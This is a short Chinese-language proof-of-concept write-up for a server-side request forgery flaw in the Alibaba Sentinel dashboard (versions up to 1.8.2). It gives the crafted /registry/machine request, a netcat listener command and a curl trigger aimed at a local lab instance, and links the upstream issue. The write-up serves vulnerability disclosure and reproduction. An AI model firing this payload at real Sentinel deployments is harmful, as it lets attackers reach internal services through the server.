### SSRF
影响范围：
Sentinel <= 1.8.2
```
/registry/machine?app=SSRF-TEST&appType=0&version=0&hostname=TEST&ip=localhost:12345%23&port=0
```

> 到github拉取开源代码https://github.com/alibaba/Sentinel

> 运行Sentinel/sentinel-dashboard/src/main/java/com/alibaba/csp/sentinel/dashboard/DashboardApplication.java即可启动sentinel-dashboard后台

> 本地监听12345端口，nc -lvvp 12345

> 发起对本地localhost端口为12345的SSRF GET攻击，curl -XGET 'http://127.0.0.1:8080/registry/machine?app=SSRF-TEST&appType=0&version=0&hostname=TEST&ip=localhost:12345%23&port=0'


在1.8.0版本下：
![image](https://user-images.githubusercontent.com/30398606/175850297-f3b5e2fc-03b7-4c31-ae5e-e693f2ca66ca.png)



在1.8.4版本下：
![image](https://user-images.githubusercontent.com/30398606/175849756-db15a6ec-14dd-478d-91c4-4b5e9e8452e6.png)

![image](https://user-images.githubusercontent.com/30398606/175849703-850b3562-c13f-4a65-b762-e5fbd5da4d45.png)


Ref:
- https://github.com/alibaba/Sentinel/issues/2451
